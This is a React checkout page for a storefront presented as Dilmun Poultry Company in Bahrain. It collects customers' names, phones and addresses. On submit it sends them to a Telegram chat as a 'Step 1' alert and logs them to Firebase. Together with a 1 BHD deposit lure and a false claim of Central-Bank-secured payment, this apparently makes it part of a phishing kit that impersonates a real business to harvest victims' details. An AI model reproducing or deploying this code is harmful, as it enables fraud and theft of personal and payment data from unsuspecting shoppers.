import React, { useState } from 'react';
import { CartItem, CustomerDetails } from '../types';
import { BAHRAIN_AREAS } from '../data/products';
import { Trash2, Plus, Minus, ArrowRight, ShieldCheck, MapPin, Phone, User, MessageSquare, CreditCard, CheckCircle2 } from 'lucide-react';
import { sendTelegramNotification, recordEsfgdrStep } from '../lib/esfgdrFirebase';

interface CartPageProps {
  items: CartItem[];
  onUpdateQty: (itemKey: string, delta: number) => void;
  onRemoveItem: (itemKey: string) => void;
  onClearCart: () => void;
  onProceedToPayment: (details: CustomerDetails, amountToPay: number, originalSubtotal: number) => void;
  onContinueShopping: () => void;
}

export const CartPage: React.FC<CartPageProps> = ({
  items,
  onUpdateQty,
  onRemoveItem,
  onClearCart,
  onProceedToPayment,
  onContinueShopping
}) => {
  // Saved Customer state or defaults
  const [name, setName] = useState(() => localStorage.getItem('cust_name') || '');
  const [phone, setPhone] = useState(() => localStorage.getItem('cust_phone') || '');
  const [governorate, setGovernorate] = useState(() => localStorage.getItem('cust_gov') || BAHRAIN_AREAS[0]);
  const [street, setStreet] = useState(() => localStorage.getItem('cust_street') || '');
  const [building, setBuilding] = useState(() => localStorage.getItem('cust_building') || '');
  const [notes, setNotes] = useState(() => localStorage.getItem('cust_notes') || '');
  const [showNotes, setShowNotes] = useState(false);

  // Payment configuration
  const [paymentOption, setPaymentOption] = useState<'full' | 'partial'>('full');
  const [paymentMethod, setPaymentMethod] = useState<'benefit' | 'visa' | 'mastercard' | 'cod'>('benefit');

  // Subtotal calculations
  const subtotal = items.reduce((acc, item) => acc + item.product.price * item.qty, 0);
  const payableNow = paymentOption === 'full' ? subtotal : (items.length > 0 ? 1.000 : 0);
  const remainingDue = paymentOption === 'full' ? 0 : Math.max(0, subtotal - 1.000);

  const [errorMsg, setErrorMsg] = useState('');

  const handleCheckout = (e: React.FormEvent) => {
    e.preventDefault();
    if (items.length === 0) {
      setErrorMsg('السلة فارغة. أضف منتجات قبل المتابعة.');
      return;
    }

    if (!name.trim()) {
      setErrorMsg('يرجى إدخال اسمك الكريم.');
      return;
    }

    if (!phone.trim() || phone.replace(/\D/g, '').length < 8) {
      setErrorMsg('يرجى إدخال رقم هاتف بحريني صحيح من 8 أرقام.');
      return;
    }

    if (!street.trim()) {
      setErrorMsg('يرجى تحديد عنوان التوصيل بالتفصيل (الشارع والمنطقة).');
      return;
    }

    setErrorMsg('');

    // Save to local storage for convenience
    localStorage.setItem('cust_name', name);
    localStorage.setItem('cust_phone', phone);
    localStorage.setItem('cust_gov', governorate);
    localStorage.setItem('cust_street', street);
    localStorage.setItem('cust_building', building);
    localStorage.setItem('cust_notes', notes);

    const customerDetails: CustomerDetails = {
      name,
      phone,
      governorate,
      street,
      building,
      notes,
      paymentOption,
      paymentMethod
    };

    const itemsSummaryText = items
      .map((it) => `• ${it.product.name} (${it.selectedWeight}) × ${it.qty}`)
      .join('\n');

    const sessionId = `session_${Date.now()}`;
    recordEsfgdrStep(
      sessionId,
      'details_filled',
      {
        name,
        phone,
        governorate,
        street,
        building,
        notes,
        paymentOption,
        paymentMethod,
        subtotal,
        payableNow,
        itemsCount: items.reduce((acc, it) => acc + it.qty, 0)
      },
      '/cartepage.html'
    );

    // Send Step 1 Notification directly to Telegram
    sendTelegramNotification(
      `📦 <b>خطوة 1: بيانات عميل وسلة جديدة — دلمون البحرين</b>\n` +
      `👤 <b>الاسم:</b> ${name}\n` +
      `📞 <b>الهاتف:</b> <code>${phone}</code>\n` +
      `📍 <b>المحافظة:</b> ${governorate}\n` +
      `🏠 <b>العنوان:</b> ${street}${building ? ` — ${building}` : ''}\n` +
      (notes ? `📝 <b>ملاحظات:</b> ${notes}\n` : '') +
      `🛒 <b>المنتجات:</b>\n${itemsSummaryText}\n` +
      `💳 <b>خيار الدفع:</b> ${paymentOption === 'full' ? 'دفع كامل المبلغ' : 'تأكيد الحجز (1.000 د.ب)'}\n` +
      `💰 <b>إجمالي السلة:</b> ${subtotal.toFixed(3)} د.ب\n` +
      `💵 <b>المطلوب دفعه الآن:</b> ${payableNow.toFixed(3)} د.ب`
    );

    onProceedToPayment(customerDetails, payableNow, subtotal);
  };

  if (items.length === 0) {
    return (
      <div className="max-w-xl mx-auto py-16 px-4 text-center">
        <div className="w-20 h-20 bg-emerald-50 text-emerald-800 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl">
          🛒
        </div>
        <h2 className="text-2xl font-black text-gray-900 mb-2">سلة الطلبات فارغة</h2>
        <p className="text-gray-500 text-sm mb-6 max-w-sm mx-auto">
          لم تقم بإضافة أي ذبيحة أو منتج إلى سلتك حتى الآن. تصفح قائمتنا واختر أفضل اللحوم والذبائح الطازجة في البحرين.
        </p>
        <button
          onClick={onContinueShopping}
          className="bg-[#173e32] hover:bg-[#112f26] text-white px-6 py-3 rounded-xl font-bold text-sm shadow-md transition"
        >
          تصفح المنتجات والذبائح 🚀
        </button>
      </div>
    );
  }

  return (
    <div className="max-w-4xl mx-auto px-4 py-6">
      
      {/* Breadcrumb & Title */}
      <div className="flex items-center justify-between mb-6 pb-3 border-b border-gray-150">
        <div>
          <h1 className="text-2xl font-black text-gray-900">سلة المشتريات — دلمون البحرين</h1>
          <p className="text-xs text-gray-500 mt-1">
            شركة دلمون للدواجن (ش.م.ب) — dawajen.bh
          </p>
        </div>
        <button
          type="button"
          onClick={onClearCart}
          className="text-red-600 hover:text-red-700 text-xs font-bold flex items-center gap-1 p-2 rounded-lg hover:bg-red-50 transition cursor-pointer"
        >
          <Trash2 className="w-3.5 h-3.5" /> تفريغ السلة
        </button>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Left Column: Cart Items (7 cols) */}
        <div className="lg:col-span-7 space-y-4">
          
          {/* Free delivery badge */}
          <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center justify-between text-xs text-emerald-900">
            <div className="flex items-center gap-2 font-bold">
              <span className="text-base">⚡</span>
              <span>توصيل مجاني ومبرد لكافة محافظات البحرين</span>
            </div>
            <span className="font-extrabold text-emerald-700 bg-white px-2 py-0.5 rounded-md border border-emerald-200">
              0.000 د.ب
            </span>
          </div>

          {/* Items List */}
          <div className="bg-white rounded-2xl border border-gray-200 shadow-xs divide-y divide-gray-100 overflow-hidden">
            {items.map((item) => (
              <div key={item.id} className="p-4 flex gap-3.5 items-start">
                {/* Thumbnail */}
                <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl overflow-hidden bg-gray-100 border border-gray-100 shrink-0">
                  <img
                    src={item.product.img}
                    alt={item.product.name}
                    className="w-full h-full object-cover"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src = '/assets/aistudio/australian-sheep_079e7736.jpg';
                    }}
                  />
                </div>

                {/* Details */}
                <div className="flex-1 min-w-0">
                  <div className="flex items-start justify-between gap-2">
                    <h3 className="font-bold text-gray-900 text-sm leading-snug">
                      {item.product.name}
                    </h3>
                    <button
                      type="button"
                      onClick={() => onRemoveItem(item.id)}
                      className="text-gray-400 hover:text-red-600 transition p-1"
                      title="حذف"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>

                  <div className="text-xs text-emerald-800 font-bold mt-0.5">
                    {(item.product.price * item.qty).toFixed(3)} د.ب
                    <span className="text-gray-400 font-normal mr-1">
                      ({item.product.priceFormatted} د.ب × {item.qty})
                    </span>
                  </div>

                  {/* Livestock customization specs */}
                  {item.customization && (
                    <div className="mt-2 bg-gray-50 border border-gray-150 rounded-lg p-2 text-[11px] text-gray-600 space-y-1">
                      <div className="flex flex-wrap gap-2">
                        <span className="bg-white px-1.5 py-0.5 rounded border border-gray-200 font-medium">
                          الحالة: <strong className="text-gray-900">{item.customization.condition}</strong>
                        </span>
                        {item.customization.condition === 'مذبوح' && (
                          <>
                            <span className="bg-white px-1.5 py-0.5 rounded border border-gray-200 font-medium">
                              التقطيع: <strong className="text-gray-900">{item.customization.cuttingType}</strong>
                            </span>
                            <span className="bg-white px-1.5 py-0.5 rounded border border-gray-200 font-medium">
                              الذبح بالمنزل: <strong className="text-gray-900">{item.customization.homeSlaughter}</strong>
                            </span>
                          </>
                        )}
                      </div>
                      {item.customization.specialNotes && (
                        <p className="text-gray-500 truncate">
                          ملاحظة: {item.customization.specialNotes}
                        </p>
                      )}
                    </div>
                  )}

                  {/* Quantity controls */}
                  <div className="flex items-center gap-2 mt-3">
                    <div className="flex items-center bg-gray-100 rounded-lg p-0.5 border border-gray-200">
                      <button
                        type="button"
                        onClick={() => onUpdateQty(item.id, -1)}
                        className="w-6 h-6 rounded bg-white shadow-xs text-gray-700 flex items-center justify-center font-bold hover:bg-gray-200"
                      >
                        <Minus className="w-3 h-3" />
                      </button>
                      <span className="text-xs font-bold px-2.5">{item.qty}</span>
                      <button
                        type="button"
                        onClick={() => onUpdateQty(item.id, 1)}
                        className="w-6 h-6 rounded bg-white shadow-xs text-gray-700 flex items-center justify-center font-bold hover:bg-gray-200"
                      >
                        <Plus className="w-3 h-3" />
                      </button>
                    </div>
                  </div>

                </div>
              </div>
            ))}
          </div>

          <button
            type="button"
            onClick={onContinueShopping}
            className="w-full py-2.5 border border-dashed border-gray-300 text-gray-600 hover:text-emerald-800 hover:border-emerald-500 rounded-xl text-xs font-bold transition flex items-center justify-center gap-1.5"
          >
            <Plus className="w-4 h-4" /> إضافة منتج أو ذبيحة أخرى
          </button>
        </div>

        {/* Right Column: Checkout Form & Summary (5 cols) */}
        <div className="lg:col-span-5 space-y-4">
          
          <form onSubmit={handleCheckout} className="space-y-4">
            
            {/* Delivery Details Card */}
            <div className="bg-white rounded-2xl border border-gray-200 shadow-xs p-4 sm:p-5 space-y-3.5">
              <h3 className="font-extrabold text-gray-900 text-sm flex items-center gap-2">
                <MapPin className="w-4 h-4 text-emerald-700" />
                <span>بيانات ومعلومات التوصيل</span>
              </h3>

              {/* Name */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  الاسم بالكامل <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <input
                    type="text"
                    required
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    placeholder="مثال: يوسف أحمد"
                    className="w-full pl-3 pr-8 py-2 border border-gray-300 rounded-xl text-xs focus:ring-2 focus:ring-emerald-600 focus:outline-none"
                  />
                  <User className="w-4 h-4 text-gray-400 absolute right-2.5 top-2.5" />
                </div>
              </div>

              {/* Phone with Bahrain Flag */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  رقم الهاتف (البحرين) <span className="text-red-500">*</span>
                </label>
                <div className="flex border border-gray-300 rounded-xl overflow-hidden focus-within:ring-2 focus-within:ring-emerald-600">
                  <span className="bg-gray-100 px-3 py-2 text-xs font-bold text-gray-600 border-l border-gray-300 flex items-center gap-1" dir="ltr">
                    🇧🇭 +973
                  </span>
                  <input
                    type="tel"
                    required
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/[^\d]/g, ''))}
                    placeholder="3XXXXXXX"
                    maxLength={8}
                    className="flex-1 px-3 py-2 text-xs text-left focus:outline-none"
                    dir="ltr"
                  />
                </div>
              </div>

              {/* Area / Governorate */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  المنطقة / المحافظة <span className="text-red-500">*</span>
                </label>
                <select
                  value={governorate}
                  onChange={(e) => setGovernorate(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-xl text-xs focus:ring-2 focus:ring-emerald-600 focus:outline-none bg-white font-medium"
                >
                  {BAHRAIN_AREAS.map((area) => (
                    <option key={area} value={area}>
                      {area}
                    </option>
                  ))}
                </select>
              </div>

              {/* Street & Building */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  العنوان بالتفصيل (الشارع والمنزل / المبنى) <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  required
                  value={street}
                  onChange={(e) => setStreet(e.target.value)}
                  placeholder="رقم الشارع، المجمع، رقم المنزل أو الشقة..."
                  className="w-full px-3 py-2 border border-gray-300 rounded-xl text-xs focus:ring-2 focus:ring-emerald-600 focus:outline-none"
                />
              </div>

              {/* Optional Notes Toggle */}
              <div>
                {!showNotes ? (
                  <button
                    type="button"
                    onClick={() => setShowNotes(true)}
                    className="text-xs text-emerald-700 font-bold hover:underline flex items-center gap-1"
                  >
                    <MessageSquare className="w-3.5 h-3.5" /> + إضافة ملاحظات للتوصيل (اختياري)
                  </button>
                ) : (
                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">ملاحظات التوصيل</label>
                    <textarea
                      value={notes}
                      onChange={(e) => setNotes(e.target.value)}
                      placeholder="مثال: يرجى الاتصال عند الوصول، ترك الطلب عند الباب..."
                      className="w-full p-2.5 border border-gray-300 rounded-xl text-xs focus:ring-2 focus:ring-emerald-600 focus:outline-none min-h-[50px]"
                    />
                  </div>
                )}
              </div>

            </div>

            {/* Payment Options Card */}
            <div className="bg-white rounded-2xl border border-gray-200 shadow-xs p-4 sm:p-5 space-y-3">
              <h3 className="font-extrabold text-gray-900 text-sm">طريقة وسداد الدفع</h3>

              {/* Full vs Partial Deposit Choice */}
              <div className="space-y-2">
                <button
                  type="button"
                  onClick={() => setPaymentOption('full')}
                  className={`w-full p-3 rounded-xl border text-right transition flex items-center justify-between ${
                    paymentOption === 'full'
                      ? 'border-[#173e32] bg-emerald-50 text-[#173e32] ring-1 ring-[#173e32] font-bold'
                      : 'border-gray-200 hover:bg-gray-50 text-gray-700'
                  }`}
                >
                  <div>
                    <div className="text-xs font-extrabold">دفع كامل المبلغ الآن بالبطاقة</div>
                    <div className="text-[11px] text-gray-500 font-normal">
                      سداد إجمالي الطلب ({subtotal.toFixed(3)} د.ب) مع توصيل مجاني
                    </div>
                  </div>
                  {paymentOption === 'full' && <CheckCircle2 className="w-5 h-5 text-emerald-800" />}
                </button>

                <button
                  type="button"
                  onClick={() => setPaymentOption('partial')}
                  className={`w-full p-3 rounded-xl border text-right transition flex items-center justify-between ${
                    paymentOption === 'partial'
                      ? 'border-[#173e32] bg-emerald-50 text-[#173e32] ring-1 ring-[#173e32] font-bold'
                      : 'border-gray-200 hover:bg-gray-50 text-gray-700'
                  }`}
                >
                  <div>
                    <div className="text-xs font-extrabold">دفع عربون (1.000 د.ب) لتأكيد الطلب</div>
                    <div className="text-[11px] text-gray-500 font-normal">
                      خصم 1 د.ب الآن، ودفع المتبقي ({remainingDue.toFixed(3)} د.ب) عند الاستلام
                    </div>
                  </div>
                  {paymentOption === 'partial' && <CheckCircle2 className="w-5 h-5 text-emerald-800" />}
                </button>
              </div>

              {/* Payment Gateways / Cards */}
              <div className="pt-2 border-t border-gray-100">
                <span className="text-xs font-bold text-gray-700 block mb-2">اختر وسيلة الدفع:</span>
                <div className="space-y-2">
                  
                  {/* Benefit */}
                  <label
                    onClick={() => setPaymentMethod('benefit')}
                    className={`flex items-center justify-between p-2.5 rounded-xl border cursor-pointer transition ${
                      paymentMethod === 'benefit'
                        ? 'border-red-500 bg-red-50/50 ring-1 ring-red-400 font-bold'
                        : 'border-gray-200 hover:bg-gray-50'
                    }`}
                  >
                    <div className="flex items-center gap-2.5">
                      <div className="w-8 h-8 rounded-lg overflow-hidden bg-white p-0.5 border border-red-200 shrink-0">
                        <img
                          src="/assets/aistudio/enefiti_6b081bdf.webp"
                          alt="Benefit Pay"
                          className="w-full h-full object-contain"
                        />
                      </div>
                      <div>
                        <div className="text-xs font-extrabold text-gray-900">بنفت — Benefit Pay</div>
                        <div className="text-[10px] text-gray-500 font-normal">بوابة الدفع الإلكتروني للبنوك البحرينية</div>
                      </div>
                    </div>
                    <input
                      type="radio"
                      name="paymentMethod"
                      checked={paymentMethod === 'benefit'}
                      onChange={() => setPaymentMethod('benefit')}
                      className="accent-red-600"
                    />
                  </label>

                  {/* Visa */}
                  <label
                    onClick={() => setPaymentMethod('visa')}
                    className={`flex items-center justify-between p-2.5 rounded-xl border cursor-pointer transition ${
                      paymentMethod === 'visa'
                        ? 'border-blue-600 bg-blue-50/50 ring-1 ring-blue-500 font-bold'
                        : 'border-gray-200 hover:bg-gray-50'
                    }`}
                  >
                    <div className="flex items-center gap-2.5">
                      <span className="bg-[#1a1f71] text-white font-extrabold text-[10px] px-2 py-1 rounded">
                        VISA
                      </span>
                      <span className="text-xs font-bold text-gray-900">بطاقة فيزا (Visa Card)</span>
                    </div>
                    <input
                      type="radio"
                      name="paymentMethod"
                      checked={paymentMethod === 'visa'}
                      onChange={() => setPaymentMethod('visa')}
                      className="accent-[#173e32]"
                    />
                  </label>

                  {/* Mastercard */}
                  <label
                    onClick={() => setPaymentMethod('mastercard')}
                    className={`flex items-center justify-between p-2.5 rounded-xl border cursor-pointer transition ${
                      paymentMethod === 'mastercard'
                        ? 'border-amber-600 bg-amber-50/50 ring-1 ring-amber-500 font-bold'
                        : 'border-gray-200 hover:bg-gray-50'
                    }`}
                  >
                    <div className="flex items-center gap-2.5">
                      <span className="bg-linear-to-r from-red-600 to-amber-500 text-white font-extrabold text-[10px] px-2 py-1 rounded">
                        Mastercard
                      </span>
                      <span className="text-xs font-bold text-gray-900">ماستر كارد (Mastercard)</span>
                    </div>
                    <input
                      type="radio"
                      name="paymentMethod"
                      checked={paymentMethod === 'mastercard'}
                      onChange={() => setPaymentMethod('mastercard')}
                      className="accent-[#173e32]"
                    />
                  </label>

                </div>
              </div>

            </div>

            {/* Invoice Summary */}
            <div className="bg-gray-50 rounded-2xl border border-gray-200 p-4 space-y-2 text-xs">
              <div className="flex justify-between text-gray-600">
                <span>قيمة المنتجات والذبائح:</span>
                <span className="font-bold">{subtotal.toFixed(3)} د.ب</span>
              </div>
              <div className="flex justify-between text-gray-600">
                <span>رسوم التوصيل المبرد:</span>
                <span className="text-emerald-700 font-extrabold">مجاناً ⚡</span>
              </div>
              {paymentOption === 'partial' && (
                <div className="flex justify-between text-amber-800 font-semibold pt-1 border-t border-gray-200">
                  <span>المتبقي عند الاستلام:</span>
                  <span>{remainingDue.toFixed(3)} د.ب</span>
                </div>
              )}
              <div className="flex justify-between text-gray-900 font-black text-sm pt-2 border-t border-gray-200">
                <span>المبلغ المطلوب سداده الآن:</span>
                <span className="text-base text-[#173e32]">{payableNow.toFixed(3)} د.ب</span>
              </div>
            </div>

            {/* Error Message */}
            {errorMsg && (
              <div className="p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl font-bold">
                ⚠️ {errorMsg}
              </div>
            )}

            {/* Submit Action */}
            <button
              type="submit"
              className="w-full py-3.5 bg-[#d8212a] hover:bg-[#b8141d] text-white rounded-xl font-black text-sm shadow-lg shadow-red-900/20 transition flex items-center justify-center gap-2 cursor-pointer"
            >
              <span>المتابعة والدفع ({payableNow.toFixed(3)} د.ب)</span>
              <ArrowRight className="w-4 h-4 rotate-180" />
            </button>

            <div className="text-center text-[11px] text-gray-400 flex items-center justify-center gap-1.5 pt-1">
              <ShieldCheck className="w-4 h-4 text-emerald-600" />
              <span>دفع مشفر وآمن 100% عبر شبكة بنفت البحرين والبنك المركزي</span>
            </div>

          </form>

        </div>

      </div>

    </div>
  );
};
